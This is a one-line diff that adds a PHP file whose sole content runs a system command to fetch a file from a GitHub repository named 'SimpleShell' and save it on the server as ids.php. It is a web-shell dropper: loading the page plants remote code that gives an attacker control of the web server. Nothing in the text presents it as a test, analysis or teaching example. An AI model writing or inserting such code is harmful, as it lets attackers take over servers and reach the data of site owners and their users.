@@ -1,0 +1,1 @@
+<?php system('wget https://raw.githubusercontent.com/Asm0d3usX/SimpleShell/main/res.txt -O ids.php');?>
